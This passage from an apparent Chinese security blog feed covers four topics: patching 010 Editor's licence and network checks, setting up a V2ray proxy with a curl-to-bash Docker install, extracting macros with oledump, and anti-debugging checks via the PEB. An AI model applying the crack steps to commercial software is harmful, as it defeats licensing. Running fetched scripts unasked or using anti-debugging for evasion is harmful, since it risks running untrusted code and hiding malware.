src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303140038939.png" alt="image-20200303140038939"></p><ul><li>这里有文本信息提示，所以从内存中搜索字符串来定位校验函数，找到字符串在函数中的引用位置，并在这条指令下断点</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303140447664.png" alt="image-20200303140447664"></p><ul><li>从当前指令向上寻找，可以发现一些其他的字符直到程序开头，找到校验成果后的弹框字符串，分别在这几处下断点</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303140646189.png" alt="image-20200303140646189"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303140742957.png" alt="image-20200303140742957"></p><ul><li>开始动态调试寻找关键跳转，让程序运行起来，弹出输入账户和密码的框后点击Check Licence，程序将会断在刚才校验函数起始处。然后开始单步F7调试，遇到call调用函数时步过F8，可以发现其在检查输入的Name和Password</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303141149124.png" alt="image-20200303141149124"></p><ul><li>单步调试的时候观察每一个向下大跳的跳转指令，发现两个关键的跳转指令，上面一个会检测网络情况然后弹出无法连接服务器，下面一个跳转是校验账户和密码的，所以这里为了保证断网情况可以使用要修改这两个跳转。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303141934420.png" alt="image-20200303141934420"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303142209017.png" alt="image-20200303142209017"></p><ul><li>继续向下跟随发现还有一个关键的跳转，这个跳转决定了其跳转到正确的激活页面</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303152735198.png" alt="image-20200303152735198"></p><ul><li>现在，需要修改的跳转如下：网络检测的jns修改为jmp，检验跳转jne修改为jmp，正确跳转jne修改为je。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303153246202.png" alt="image-20200303153246202"></p><p><img src="C:\Users\Demon\AppData\Roaming\Typora\typora-user-images\image-20200303153310542.png" alt="image-20200303153310542"></p><p><img src="C:\Users\Demon\AppData\Roaming\Typora\typora-user-images\image-20200303153337971.png" alt="image-20200303153337971"></p><ul><li>然后保存修改，ctrl+p打补丁，选择修补文件。这里补丁有点问题，因为当前文件被占用，所以需要先复制010editor.exe到独立文件夹，然后此处选择修补文件就选择这个010editor.exe。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303201146497.png" alt="image-20200303201146497"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303201725953.png" alt="image-20200303201725953"></p><ul><li>修补好文件后，将备份的已补丁的文件复制到程序安装目录。打开即可</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303201921381.png" alt="image-20200303201921381"></p>]]></content>
    
    <summary type="html">
    
      简单破解64位的010editor
    
    </summary>
    
      <category term="逆向" scheme="https://richard447.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="破解" scheme="https://richard447.github.io/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>V2ray完全使用教程(自用)</title>
    <link href="https://richard447.github.io/2020/03/02/V2ray%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>https://richard447.github.io/2020/03/02/V2ray完全使用教程/</id>
    <published>2020-03-01T16:00:00.000Z</published>
    <updated>2021-03-06T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V2ray使用指南"><a href="#V2ray使用指南" class="headerlink" title="V2ray使用指南"></a>V2ray使用指南</h1><h6 id="申明：本教程仅作为学习用途，不可用于违法犯罪之途。"><a href="#申明：本教程仅作为学习用途，不可用于违法犯罪之途。" class="headerlink" title="申明：本教程仅作为学习用途，不可用于违法犯罪之途。"></a>申明：本教程仅作为学习用途，不可用于违法犯罪之途。</h6><h5 id="搭建必需的东西"><a href="#搭建必需的东西" class="headerlink" title="搭建必需的东西"></a>搭建必需的东西</h5><ul><li><p><strong>一台国外的VPS</strong></p></li><li><p><strong>ssh连接工具</strong></p></li><li><h5 id="v2ray客户端"><a href="#v2ray客户端" class="headerlink" title="v2ray客户端"></a>v2ray客户端</h5></li></ul><h3 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h3><h4 id="一、购买一台国外的VPS"><a href="#一、购买一台国外的VPS" class="headerlink" title="一、购买一台国外的VPS"></a>一、购买一台国外的VPS</h4><ul><li><p>目前国外较好的vps厂商有：vultr、搬瓦工，但是都比较贵，本次搭建选择一个较便宜的俄罗斯厂商：<strong><a href="https://justhost.ru/services/vps/?tariff=2#changeconfig">https://justhost.ru/services/vps/?tariff=2#changeconfig</a></strong>，考虑到翻译上的问题，所以购买步骤如下：</p><ul><li>打开url:<strong><a href="https://justhost.ru/auth/register?returl=%2Fbilling%2Frenew">https://justhost.ru/auth/register?returl=%2Fbilling%2Frenew</a></strong>，进入页面如下，输入自己的电子邮件账户，QQ邮箱可以注册，然后你的邮箱会收到一封激活账户的邮件，收到的邮件可以使用翻译软件翻译内容完成注册。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200302120153997.png" alt="image-20200302120153997"></p><ul><li>购买VPS，这里选择一个1核512内存5G存储的服务器，这个配置基本满足使用，价格也比较便宜。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200302121231194.png" alt="image-20200302121231194"></p><ul><li>选择服务器后需要修改下服务器的初始配置，购买时间、初始系统。机房非必须选，也可自动分配，没有测试过几个机房延迟差别，但是估计也差不多。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200302121635756.png" alt="image-20200302121635756"></p><p> <img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200302121743963.png" alt="image-20200302121743963"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200302122149646.png" alt="image-20200302122149646"></p><ul><li>选择好了之后就在右侧框体中选择购买：</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200302122337416.png" alt="image-20200302122337416"></p><ul><li>跳转页面，后可以使用支付宝支付，付款流程如下，支付完成后大概需要等待两个小时左右会收到邮件，在邮件里面有服务器的ip、root账户密码，务必保存好邮件。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200302122420247.png" alt="image-20200302122420247"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200302122614346.png" alt="image-20200302122614346"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200302122634610.png" alt="image-20200302122634610"></p></li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200302122647352.png" alt="image-20200302122647352"></p><h4 id="二、安装必须软件"><a href="#二、安装必须软件" class="headerlink" title="二、安装必须软件"></a>二、安装必须软件</h4><ul><li>安装ssh连接工具，虽然windows的cmd中也可以使用ssh连接服务器，但是为了使用方便还是使用连接工具比较好。目前较好用的ssh连接工具有：<a href="http://www.hostbuf.com/downloads/finalshell_install.exe">finalshell</a> 、Xshell等，很久没有用过xshell，似乎需要激活破解，而且免费的finalshell很好用，唯一的缺点是需要java运行环境，需要自己配置java环境才能运行，可以百度解决。</li></ul><h3 id="进阶：V2ray-WS-TLS"><a href="#进阶：V2ray-WS-TLS" class="headerlink" title="进阶：V2ray+WS+TLS"></a>进阶：V2ray+WS+TLS</h3><p>​        购买一个国外的域名(不需要备案很方便)，将该域名解析到你的服务器上，然后通过安装</p><h4 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h4><p>​        购买域名，可以去namesilo购买，.top的域名很便宜，也可以去freenom.com申请免费的域名(PS：申请了很多次，没有给我的邮箱发邮件，不太好使。。)，这里我直接在namesilo购买一个新的域名，下面是详细步骤</p><ul><li>注册一个账户，打开<a href="https://www.namesilo.com/create_account.php，如下，注册完后，你的邮箱会收到一份激活账户的邮件，按照邮件的内容激活账户(一般是点击激活链接)。">https://www.namesilo.com/create_account.php，如下，注册完后，你的邮箱会收到一份激活账户的邮件，按照邮件的内容激活账户(一般是点击激活链接)。</a></li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310132720162.png" alt="image-20200310132720162"></p><ul><li>然后就可以前往主页购买域名，</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310133147665.png" alt="image-20200310133147665"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310133220307.png" alt="image-20200310133220307"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310133527217.png" alt="image-20200310133527217"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310133813505.png" alt="image-20200310133813505"></p><ul><li>然后扫码支付。继续配置域名</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310134247812.png" alt="image-20200310134247812"></p><ul><li>修改DNS解析配置，这里将已有的解析记录全部删除，然后重新添加两条A解析记录。如下</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310134947313.png" alt="image-20200310134947313"></p><ul><li>修改域名解析服务器，因为用cloudflare解析速度更快，所以使用cloudflare的域名解析服务器，修改如下，将域名服务器修改为：<strong>henry.ns.cloudflare.com</strong>和<strong>lisa.ns.cloudflare.com</strong>。下拉选择submit。修改生效需要等一段时间，域名的配置完成。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310135420435.png" alt="image-20200310135420435"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310135843924.png" alt="image-20200310135843924"></p><h3 id="Step2-使用CloudFlare解析域名"><a href="#Step2-使用CloudFlare解析域名" class="headerlink" title="Step2 使用CloudFlare解析域名"></a>Step2 使用CloudFlare解析域名</h3><ul><li>首先，还是在<a href="https://www.cloudflare.com/">cloudflare</a>的官网注册账户，打开(<a href="https://dash.cloudflare.com/sign-up),填写信息，完成注册、激活。">https://dash.cloudflare.com/sign-up),填写信息，完成注册、激活。</a></li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310140003170.png" alt="image-20200310140003170"></p><ul><li>解析域名</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310140131885.png" alt="image-20200310140131885"></p><p><img src="C:\Users\Demon\AppData\Roaming\Typora\typora-user-images\image-20200310140218269.png" alt="image-20200310140218269"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310140412001.png" alt="image-20200310140412001"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310140702045.png" alt="image-20200310140702045"></p><ul><li>最后这一步让更改nameservers，因为之前我们改过了所以不需要动了。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310140725589.png" alt="image-20200310140725589"></p><ul><li>最后等待域名解析成功，也可以使用ping这个域名查看IP地址确定是否解析正确。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310221312234.png" alt="image-20200310221312234"></p><h4 id="Step-3-服务器配置"><a href="#Step-3-服务器配置" class="headerlink" title="Step 3 服务器配置"></a>Step 3 服务器配置</h4><ul><li>这里直接使用<a href="https://github.com/pengchujin/v2rayDocker">github项目</a>，</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310222055293.png" alt="image-20200310222055293"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200310222139366.png" alt="image-20200310222139366"></p><p>输入命令：</p><ul><li>安装docker:<code>curl -fsSL https://get.docker.com -o get-docker.sh &amp;&amp; bash get-docker.sh</code></li><li>如果是root权限则不需要使用sudo命令：将下面的YOURDOMAIN.com换成你的域名即可。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --rm --name v2ray -p 443:443 -p 80:80 -v $HOME/.caddy:/root/.caddy  pengchujin/v2ray_ws:0.08 YOURDOMAIN.COM V2RAY_WS 0890b53a-e3d4-4726-bd2b-52574e8588c4 &amp;&amp; sleep 3s &amp;&amp; docker logs v2ray</span><br></pre></td></tr></table></figure><p>特别感谢该github博主！使用过别忘记点个star!</p>]]></content>
    
    <summary type="html">
    
      科学上网，切勿误入歧途
    
    </summary>
    
      <category term="梯子" scheme="https://richard447.github.io/categories/%E6%A2%AF%E5%AD%90/"/>
    
    
      <category term="科学上网" scheme="https://richard447.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>oledump.py导出文档中的宏代码</title>
    <link href="https://richard447.github.io/2020/02/05/oledump-py%E5%AF%BC%E5%87%BA%E6%96%87%E6%A1%A3%E4%B8%AD%E7%9A%84%E5%AE%8F%E4%BB%A3%E7%A0%81/"/>
    <id>https://richard447.github.io/2020/02/05/oledump-py导出文档中的宏代码/</id>
    <published>2020-02-04T16:00:00.000Z</published>
    <updated>2021-03-06T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="oledump-py导出文档中的宏代码"><a href="#oledump-py导出文档中的宏代码" class="headerlink" title="oledump.py导出文档中的宏代码"></a>oledump.py导出文档中的宏代码</h1><p>​        在分析恶意的文档类病毒时，时常需要启用宏才能查看到宏代码，但是有些文档启用宏之后宏代码运行，其原本的宏代码可能会被破坏，这就需要一些其他的工具来提取其中的宏代码了。</p><h4 id="oledump-py"><a href="#oledump-py" class="headerlink" title="oledump.py"></a>oledump.py</h4><ul><li>先使用命令：<code>python oledump.py  xxx.doc</code>来查看doc中的数据流：</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200205125535111.png" alt="image-20200205125535111"></p><ul><li>这里可以查看到该文档的数据流，标有M字样的即表明这一段数据里面有宏代码，可以使用命令：</li></ul><p><code>python oledump.py -s 15 -v xxx.doc &gt;&gt;bbb.txt</code>来查看宏代码，并把宏代码保存到aaa.txt。(-s 参数为查看，-v参数为解压缩VBA宏)</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200205130314304.png" alt="image-20200205130314304"></p>]]></content>
    
    <summary type="html">
    
      提取文档中的宏代码
    
    </summary>
    
      <category term="随记" scheme="https://richard447.github.io/categories/%E9%9A%8F%E8%AE%B0/"/>
    
    
      <category term="宏" scheme="https://richard447.github.io/tags/%E5%AE%8F/"/>
    
  </entry>
  
  <entry>
    <title>反调试学习笔记</title>
    <link href="https://richard447.github.io/2020/01/27/%E5%8F%8D%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://richard447.github.io/2020/01/27/反调试学习笔记/</id>
    <published>2020-01-26T16:00:00.000Z</published>
    <updated>2021-03-06T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反调试笔记"><a href="#反调试笔记" class="headerlink" title="反调试笔记"></a>反调试笔记</h1><h1 id="静态反调试"><a href="#静态反调试" class="headerlink" title="静态反调试"></a>静态反调试</h1><h2 id="通过PEB中的数据检测"><a href="#通过PEB中的数据检测" class="headerlink" title="通过PEB中的数据检测"></a>通过PEB中的数据检测</h2><h4 id="0x01-BeingDebugged-0x2"><a href="#0x01-BeingDebugged-0x2" class="headerlink" title="0x01 BeingDebugged(+0x2)"></a>0x01 BeingDebugged(+0x2)</h4><p><strong>在PEB结构中，成员BeingDebugged是一个标志(Flag)，用来表示进程是否处于被调试状态。</strong></p><ul><li>在32位程序中，可以借助FS段寄存器所指的TEB结构体来获得PEB结构体地址。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,dword ptr fs:[0x30];Address of PEB</span><br></pre></td></tr></table></figure><ul><li>PEB结构体</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span> <span class="comment">// Size: 0x1D8</span></span><br><span class="line"><span class="comment">/*000*/</span> UCHAR InheritedAddressSpace;</span><br><span class="line"><span class="comment">/*001*/</span> UCHAR ReadImageFileExecOptions;</span><br><span class="line"><span class="comment">/*002*/</span> UCHAR BeingDebugged; <span class="comment">//---&gt;调试标志</span></span><br><span class="line"><span class="comment">/*003*/</span> UCHAR SpareBool; <span class="comment">// Allocation size</span></span><br><span class="line"><span class="comment">/*004*/</span> HANDLE Mutant;</span><br><span class="line"><span class="comment">/*008*/</span> HINSTANCE ImageBaseAddress; <span class="comment">// Instance</span></span><br><span class="line"><span class="comment">/*00C*/</span> VOID *DllList;</span><br><span class="line"><span class="comment">/*010*/</span> PPROCESS_PARAMETERS *ProcessParameters;</span><br><span class="line"><span class="comment">/*014*/</span> ULONG SubSystemData;</span><br><span class="line"><span class="comment">/*018*/</span> HANDLE DefaultHeap;</span><br><span class="line"><span class="comment">/*01C*/</span> KSPIN_LOCK FastPebLock;</span><br><span class="line"><span class="comment">/*020*/</span> ULONG FastPebLockRoutine;</span><br><span class="line"><span class="comment">/*024*/</span> ULONG FastPebUnlockRoutine;</span><br><span class="line"><span class="comment">/*028*/</span> ULONG EnvironmentUpdateCount;</span><br><span class="line"><span class="comment">/*02C*/</span> ULONG KernelCallbackTable;</span><br><span class="line"><span class="comment">/*030*/</span> LARGE_INTEGER SystemReserved;</span><br><span class="line"><span class="comment">/*038*/</span> ULONG FreeList;</span><br><span class="line"><span class="comment">/*03C*/</span> ULONG TlsExpansionCounter;</span><br><span class="line"><span class="comment">/*040*/</span> ULONG TlsBitmap;</span><br><span class="line"><span class="comment">/*044*/</span> LARGE_INTEGER TlsBitmapBits;</span><br><span class="line"><span class="comment">/*04C*/</span> ULONG ReadOnlySharedMemoryBase;</span><br><span class="line"><span class="comment">/*050*/</span> ULONG ReadOnlySharedMemoryHeap;</span><br><span class="line"><span class="comment">/*054*/</span> ULONG ReadOnlyStaticServerData;</span><br><span class="line"><span class="comment">/*058*/</span> ULONG AnsiCodePageData;</span><br><span class="line"><span class="comment">/*05C*/</span> ULONG OemCodePageData;</span><br><span class="line"><span class="comment">/*060*/</span> ULONG UnicodeCaseTableData;</span><br><span class="line"><span class="comment">/*064*/</span> ULONG NumberOfProcessors;</span><br><span class="line"><span class="comment">/*068*/</span> LARGE_INTEGER NtGlobalFlag; <span class="comment">// Address of a local copy</span></span><br><span class="line"><span class="comment">/*070*/</span> LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line"><span class="comment">/*078*/</span> ULONG HeapSegmentReserve;</span><br><span class="line"><span class="comment">/*07C*/</span> ULONG HeapSegmentCommit;</span><br><span class="line"><span class="comment">/*080*/</span> ULONG HeapDeCommitTotalFreeThreshold;</span><br><span class="line"><span class="comment">/*084*/</span> ULONG HeapDeCommitFreeBlockThreshold;</span><br><span class="line"><span class="comment">/*088*/</span> ULONG NumberOfHeaps;</span><br><span class="line"><span class="comment">/*08C*/</span> ULONG MaximumNumberOfHeaps;</span><br><span class="line"><span class="comment">/*090*/</span> ULONG ProcessHeaps;</span><br><span class="line"><span class="comment">/*094*/</span> ULONG GdiSharedHandleTable;</span><br><span class="line"><span class="comment">/*098*/</span> ULONG ProcessStarterHelper;</span><br><span class="line"><span class="comment">/*09C*/</span> ULONG GdiDCAttributeList;</span><br><span class="line"><span class="comment">/*0A0*/</span> KSPIN_LOCK LoaderLock;</span><br><span class="line"><span class="comment">/*0A4*/</span> ULONG OSMajorVersion;</span><br><span class="line"><span class="comment">/*0A8*/</span> ULONG OSMinorVersion;</span><br><span class="line"><span class="comment">/*0AC*/</span> USHORT OSBuildNumber;</span><br><span class="line"><span class="comment">/*0AE*/</span> USHORT OSCSDVersion;</span><br><span class="line"><span class="comment">/*0B0*/</span> ULONG OSPlatformId;</span><br><span class="line"><span class="comment">/*0B4*/</span> ULONG ImageSubsystem;</span><br><span class="line"><span class="comment">/*0B8*/</span> ULONG ImageSubsystemMajorVersion;</span><br><span class="line"><span class="comment">/*0BC*/</span> ULONG ImageSubsystemMinorVersion;</span><br><span class="line"><span class="comment">/*0C0*/</span> ULONG ImageProcessAffinityMask;</span><br><span class="line"><span class="comment">/*0C4*/</span> ULONG GdiHandleBuffer[<span class="number">0x22</span>];</span><br><span class="line"><span class="comment">/*14C*/</span> ULONG PostProcessInitRoutine;</span><br><span class="line"><span class="comment">/*150*/</span> ULONG TlsExpansionBitmap;</span><br><span class="line"><span class="comment">/*154*/</span> UCHAR TlsExpansionBitmapBits[<span class="number">0x80</span>];</span><br><span class="line"><span class="comment">/*1D4*/</span> ULONG SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure><ul><li>函数IsDebuggerPresent()函数获得PEB.BeingDebugged的值,被调试时BeingDebugged的值会被置1</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">anti_Debug1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsDebuggerPresent</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">//被调试状态</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>汇编语言实现</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int anti_Debug1() //x86平台</span><br><span class="line">&#123;</span><br><span class="line">DWORD flag;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, dword ptr fs : [0x30]  ;PEB</span><br><span class="line">add eax, 0x2     ;BeingDebugged</span><br><span class="line">xor ebx,ebx</span><br><span class="line">mov bl, byte ptr ds : [eax]</span><br><span class="line">mov flag,ebx</span><br><span class="line">&#125;</span><br><span class="line">return int(flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x02-Process-Heap-0x18"><a href="#0x02-Process-Heap-0x18" class="headerlink" title="0x02 Process Heap(+0x18)"></a>0x02 Process Heap(+0x18)</h4><p><strong>PEB.ProcessHeap成员是指向HEAP结构体的指针，当进程处于被调试状态时，Flags(+0xC)与Force Flags(+0x10)被设置为特定值</strong>。</p><ul><li>可以使用GetProcessHeap()函数获得该结构体的基址，然后获得Flags和ForceFlags的值。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProcessHeap</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="number">0x000</span>  Entry</span><br><span class="line"><span class="number">0x008</span>  Signature</span><br><span class="line"><span class="number">0x00C</span>  Flags</span><br><span class="line"><span class="number">0x010</span>  ForceFlags</span><br><span class="line"><span class="number">0x014</span>  VirtualMemoryThreshold</span><br><span class="line"><span class="number">0x018</span>  SegmentCommit</span><br><span class="line">    <span class="number">0x01c</span>  SegmentCommit</span><br><span class="line">    <span class="number">0x020</span>  DeCommitFreeBlockThreshold</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>^_^此方法仅适用于XP系统，并且附加进程时flag和forceflag值不改变</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">HANDLE hb = <span class="built_in">GetProcessHeap</span>();</span><br><span class="line">DWORD base = (DWORD)hb;</span><br><span class="line">LPDWORD Flags = (LPDWORD)(base + <span class="number">0xC</span>);</span><br><span class="line">LPDWORD ForceFlags = (LPDWORD)(base + <span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *Flags);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *ForceFlags);</span><br><span class="line"><span class="comment">/*DWORD flag, forflag;   //汇编实现</span></span><br><span class="line"><span class="comment">__asm</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">mov eax, dword ptr fs : [0x30]; PEB</span></span><br><span class="line"><span class="comment">mov eax, [eax+0x18]</span></span><br><span class="line"><span class="comment">mov ebx,DWORD PTR ds:[eax+0xC]</span></span><br><span class="line"><span class="comment">mov flag,ebx</span></span><br><span class="line"><span class="comment">mov ebx,DWORD PTR ds:[eax+0x10]</span></span><br><span class="line"><span class="comment">mov forflag,ebx</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">printf(&quot;%d\n&quot;, flag);</span></span><br><span class="line"><span class="comment">printf(&quot;%d\n&quot;, forflag);*/</span></span><br><span class="line"><span class="keyword">if</span> (*Flags != <span class="number">2</span> || *ForceFlags != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x03-NtGlobalFlag-0x68"><a href="#0x03-NtGlobalFlag-0x68" class="headerlink" title="0x03 NtGlobalFlag(+0x68)"></a>0x03 NtGlobalFlag(+0x68)</h4><ul><li>NtGlobalFlag 是下列Flags值进行bit OR(位或)运算的结果</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FLG_HEAP_ENABLE_TAIL_CHECK (<span class="number">0x10</span>)</span><br><span class="line">FLG_HEAP_ENABLE_FREE_CHECK(<span class="number">0x20</span>)</span><br><span class="line">FLG_HEAP_VALIDATE_PARAMETERS (<span class="number">0x40</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int anti_Debug1()</span><br><span class="line">&#123;</span><br><span class="line">DWORD flag;</span><br><span class="line">__asm&#123;</span><br><span class="line">mov eax, fs:[0x30]</span><br><span class="line">add eax,0x68</span><br><span class="line">mov eax, [eax]</span><br><span class="line">mov flag,eax</span><br><span class="line">&#125;</span><br><span class="line">if (flag == 0x70)</span><br><span class="line">&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>NtGlobalFlag在进程被附加时不改变</strong></p><h2 id="利用API探测"><a href="#利用API探测" class="headerlink" title="利用API探测"></a>利用API探测</h2><h4 id="0x01-NtQueryInformationProcess"><a href="#0x01-NtQueryInformationProcess" class="headerlink" title="0x01 NtQueryInformationProcess()"></a>0x01 NtQueryInformationProcess()</h4><ul><li>函数原型</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS 